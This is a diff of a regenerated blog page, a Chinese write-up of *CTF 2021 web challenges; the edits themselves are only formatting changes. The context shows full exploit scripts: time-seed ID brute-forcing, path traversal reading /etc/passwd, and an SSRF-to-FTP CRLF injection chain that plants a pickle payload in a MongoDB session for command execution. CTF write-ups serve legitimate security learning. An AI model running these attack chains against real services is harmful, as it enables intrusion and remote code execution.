@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,7 +14,7 @@
 
     <title>*CTF2021复现 | tyskillのBlog</title>
 
-    <link rel="stylesheet" href="/css/meme.min.09e7384df2ebf8f7760291a0d443770f44b39f5563546dd950293ed79e8d779b.css"/>
+    <link rel="stylesheet" href="/css/meme.min.12acc0ca7f74225e7b015741d28e3038696047c86698a0fb722ce126d04c739e.css"/>
 
     
     
@@ -60,7 +60,7 @@
         "description": "oh-my-note 网站的功能有登录用户发表note、查看公开note和note_id，然后就无了。 评论的输入框都……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  2698 ,
+        "wordCount":  2697 ,
         "image": "https://tyskill.github.io/icons/favicon.ico",
         "author": {
             "@type": "Person",
@@ -244,7 +244,7 @@
     
     
         
-        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;2698</span>
+        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;2697</span>
     
     
         
@@ -270,12 +270,12 @@
 <p>评论的输入框都没发现XSS和SSTI漏洞。只能将目光转向用户，user_id通过时间戳生成，生成代码如下：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">timestamp</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="mi">4</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">timestamp</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="mi">4</span><span class="p">)</span>
 <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span>
 <span class="n">user_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
 </code></pre></td></tr></table></div>
@@ -283,13 +283,13 @@
 </div><p>note_id生成需要借助user_id：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">timestamp</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="mi">4</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">timestamp</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="mi">4</span><span class="p">)</span>
 <span class="n">post_at</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">fromtimestamp</span><span class="p">(</span><span class="n">timestamp</span><span class="p">,</span> <span class="n">tz</span><span class="o">=</span><span class="n">datetime</span><span class="o">.</span><span class="n">timezone</span><span class="o">.</span><span class="n">utc</span><span class="p">)</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M UTC&#39;</span><span class="p">)</span>
 <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">user_id</span> <span class="o">+</span> <span class="n">post_at</span><span class="p">)</span>
 <span class="n">note_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
@@ -306,7 +306,7 @@
 <p>exp</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -335,7 +335,7 @@
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*-coding-*-: utf-8</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*-coding-*-: utf-8</span>
 <span class="kn">import</span> <span class="nn">time</span>
 <span class="kn">import</span> <span class="nn">random</span>
 <span class="kn">import</span> <span class="nn">string</span>
@@ -349,7 +349,7 @@
 
 <span class="n">users</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="o">/</span> <span class="mi">10000</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)]</span>
 <span class="k">for</span> <span class="n">second</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">60</span><span class="p">):</span>
-    <span class="n">dt</span> <span class="o">=</span> <span class="s2">&#34;2021-01-15 10:29:{} UTC&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">second</span><span class="p">)</span> <span class="c1"># datetime.timezone.utc有时差</span>
+    <span class="n">dt</span> <span class="o">=</span> <span class="s2">&#34;2021-01-15 10:29:</span><span class="si">{}</span><span class="s2"> UTC&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">second</span><span class="p">)</span> <span class="c1"># datetime.timezone.utc有时差</span>
     <span class="n">timeArray</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">dt</span><span class="p">,</span> <span class="s2">&#34;%Y-%m-</span><span class="si">%d</span><span class="s2"> %H:%M:%S UTC&#34;</span><span class="p">)</span> <span class="c1"># 转换成时间数组</span>
     <span class="n">timestamp</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">mktime</span><span class="p">(</span><span class="n">timeArray</span><span class="p">)</span> <span class="c1"># 转换成时间戳</span>
     <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
@@ -360,8 +360,8 @@
         <span class="c1"># 获得note_id</span>
         <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">user_id</span> <span class="o">+</span> <span class="n">post_at</span><span class="p">)</span>
         <span class="k">if</span> <span class="n">get_random_id</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&#34;lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u&#34;</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span> <span class="c1"># 7bdeij4oiafjdypqyrl2znwk7w9lulgn</span>
-            <span class="nb">exit</span><span class="p">()</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span> <span class="c1"># 7bdeij4oiafjdypqyrl2znwk7w9lulgn</span>
+            <span class="n">exit</span><span class="p">()</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><h2 id="oh-my-bet"><a href="#oh-my-bet" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:oh-my-bet" class="headings">oh-my-bet</a></h2>
@@ -372,16 +372,16 @@
 <p>目录穿越读取<code>/etc/passwd</code>(一定要在注册时就抓包修改，否则读不到 or 写脚本post)，读到</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">app</span><span class="o">:</span><span class="nx">x</span><span class="o">:</span><span class="mi">100</span><span class="o">:</span><span class="mi">101</span><span class="o">:</span><span class="nx">Linux</span> <span class="nx">User</span><span class="p">,,,</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">app</span><span class="o">:/</span><span class="nx">bin</span><span class="o">/</span><span class="k">false</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">app</span><span class="o">:</span><span class="nx">x</span><span class="o">:</span><span class="mi">100</span><span class="o">:</span><span class="mi">101</span><span class="o">:</span><span class="nx">Linux</span> <span class="nx">User</span><span class="p">,,,</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">app</span><span class="o">:/</span><span class="nx">bin</span><span class="o">/</span><span class="k">false</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>知道目录，接着就可以读源码了，源码中使用了ftp协议接收内网文件</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -398,7 +398,7 @@
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">ftp_login</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">ftp_login</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
     <span class="n">ftp</span> <span class="o">=</span> <span class="n">FTP</span><span class="p">()</span>
     <span class="n">ftp</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">&#34;172.20.0.2&#34;</span><span class="p">,</span> <span class="mi">8877</span><span class="p">)</span>
     <span class="n">ftp</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s2">&#34;fan&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">)</span>
@@ -412,14 +412,14 @@
     <span class="n">f</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ftp_login</span><span class="p">()</span>
     <span class="n">f</span><span class="o">.</span><span class="n">cwd</span><span class="p">(</span><span class="s2">&#34;files&#34;</span><span class="p">)</span>
     <span class="n">buf_size</span> <span class="o">=</span> <span class="mi">1024</span>
-    <span class="n">f</span><span class="o">.</span><span class="n">retrbinary</span><span class="p">(</span><span class="s1">&#39;RETR {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">&#39;config.json&#39;</span><span class="p">),</span> <span class="bp">self</span><span class="o">.</span><span class="n">callback</span><span class="p">,</span> <span class="n">buf_size</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">retrbinary</span><span class="p">(</span><span class="s1">&#39;RETR </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">&#39;config.json&#39;</span><span class="p">),</span> <span class="bp">self</span><span class="o">.</span><span class="n">callback</span><span class="p">,</span> <span class="n">buf_size</span><span class="p">)</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>通过<code>ftp://fan:root@172.20.0.2:8877/</code>列举文件，然后<code>ftp://fan:root@172.20.0.2:8877/files/config.json</code>读取config.json和ftp-server.py</p>
 <p>config.json</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -436,7 +436,7 @@
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
   <span class="nt">&#34;secret_key&#34;</span><span class="p">:</span><span class="s2">&#34;f4545478ee86$%^&amp;&amp;%$#&#34;</span><span class="p">,</span>
   <span class="nt">&#34;DEBUG&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
   <span class="nt">&#34;SESSION_TYPE&#34;</span><span class="p">:</span> <span class="s2">&#34;mongodb&#34;</span><span class="p">,</span>
@@ -472,7 +472,7 @@
 <p>修改<code>site-packages/pymongo/network.py:142</code>，在sendall之前丢个异常</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -482,7 +482,7 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="s1">&#39;&#39;&#39;添加内容
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="s1">&#39;&#39;&#39;添加内容
 </span><span class="s1">if b&#34;session:&#34; in msg:
 </span><span class="s1">    e = Exception()
 </span><span class="s1">    e.message = msg
@@ -496,7 +496,7 @@
 <p>mongo.py</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -523,7 +523,7 @@
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*-author-*-: frankli</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*-author-*-: frankli</span>
 <span class="kn">from</span> <span class="nn">pymongo</span> <span class="kn">import</span> <span class="n">MongoClient</span>
 <span class="kn">import</span> <span class="nn">pickle</span>
 <span class="kn">import</span> <span class="nn">os</span>
@@ -541,19 +541,19 @@
         <span class="n">coll</span><span class="o">.</span><span class="n">update_one</span><span class="p">(</span>
             <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="s1">&#39;session:37386ce1-3fe8-4f1d-91fc-224581c5279f&#39;</span><span class="p">},</span>
             <span class="p">{</span><span class="s2">&#34;$set&#34;</span><span class="p">:</span> <span class="p">{</span> <span class="s2">&#34;val&#34;</span><span class="p">:</span> <span class="n">get_pickle</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">}},</span>
-            <span class="n">upsert</span><span class="o">=</span><span class="bp">True</span>
+            <span class="n">upsert</span><span class="o">=</span><span class="kc">True</span>
         <span class="p">)</span>
     <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
         <span class="k">return</span> <span class="n">e</span><span class="o">.</span><span class="n">message</span>
 
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">get_mongo</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">))</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">get_mongo</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">))</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>终极版exp</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -632,7 +632,7 @@
 </span><span class="lnt">77
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*-author-*-: frankli</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*-author-*-: frankli</span>
 <span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
 <span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">import</span> <span class="nn">socket</span>
@@ -680,35 +680,35 @@
 
 <span class="k">def</span> <span class="nf">inject</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
     <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">ssrf</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;&#39;&#39;ftp://fan:root{cmd}@{ftpd}/&#39;&#39;&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">ssrf</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;&#39;&#39;ftp://fan:root</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1">@</span><span class="si">{</span><span class="n">ftpd</span><span class="si">}</span><span class="s1">/&#39;&#39;&#39;</span><span class="p">)</span>
 
-<span class="k">def</span> <span class="nf">sendfile</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">sendfile</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
     <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
     <span class="n">sock</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
     <span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">bind</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])))</span>
     <span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
     <span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
-    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;accepted&#39;</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span>
-    <span class="n">client</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;sent&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;accepted&#39;</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span>
+    <span class="n">client</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;sent&#39;</span><span class="p">)</span>
     <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
 <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">sendfile</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">request</span><span class="p">,))</span>
 <span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">ssrf</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;ftp://fan:root@{ftpd}/&#39;</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">ssrf</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;ftp://fan:root@</span><span class="si">{</span><span class="n">ftpd</span><span class="si">}</span><span class="s1">/&#39;</span><span class="p">))</span>
 
 <span class="n">inject</span><span class="p">([</span><span class="s1">&#39;TYPE I&#39;</span><span class="p">,</span> <span class="n">get_port_cmd</span><span class="p">(</span><span class="n">bind</span><span class="p">),</span> <span class="s1">&#39;STOR frankli&#39;</span><span class="p">])</span>
 <span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="s1">&#39;uploaded&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">ssrf</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;ftp://fan:root@{ftpd}/&#39;</span><span class="p">))</span>
-<span class="k">print</span><span class="p">(</span><span class="s1">&#39;replaying&#39;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;uploaded&#39;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">ssrf</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;ftp://fan:root@</span><span class="si">{</span><span class="n">ftpd</span><span class="si">}</span><span class="s1">/&#39;</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;replaying&#39;</span><span class="p">)</span>
 <span class="n">inject</span><span class="p">([</span><span class="s1">&#39;TYPE I&#39;</span><span class="p">,</span> <span class="n">get_port_cmd</span><span class="p">(</span><span class="n">targ</span><span class="p">),</span> <span class="s1">&#39;RETR frankli&#39;</span><span class="p">])</span>
-<span class="k">print</span><span class="p">(</span><span class="s1">&#39;replayed&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;session&#39;</span><span class="p">:</span> <span class="s1">&#39;1eb74496-98b9-4acc-94fb-75ba15ddb803&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s1">&#39;requested&#39;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;replayed&#39;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;session&#39;</span><span class="p">:</span> <span class="s1">&#39;1eb74496-98b9-4acc-94fb-75ba15ddb803&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;requested&#39;</span><span class="p">)</span>
 <span class="n">inject</span><span class="p">([</span><span class="s1">&#39;RNFR frankli&#39;</span><span class="p">,</span> <span class="s1">&#39;RNTO trash&#39;</span><span class="p">])</span>
-<span class="k">print</span><span class="p">(</span><span class="n">ssrf</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;ftp://fan:root@{ftpd}/&#39;</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">ssrf</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;ftp://fan:root@</span><span class="si">{</span><span class="n">ftpd</span><span class="si">}</span><span class="s1">/&#39;</span><span class="p">))</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><h2 id="lottery-again"><a href="#lottery-again" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:lottery-again" class="headings">lottery again</a></h2>
@@ -716,7 +716,7 @@
 <p>看源码，处理抽奖部分的代码(LotteryController.php)：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -769,7 +769,7 @@
 </span><span class="lnt">51
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">LotteryController</span> <span class="k">extends</span> <span class="nx">BaseController</span>
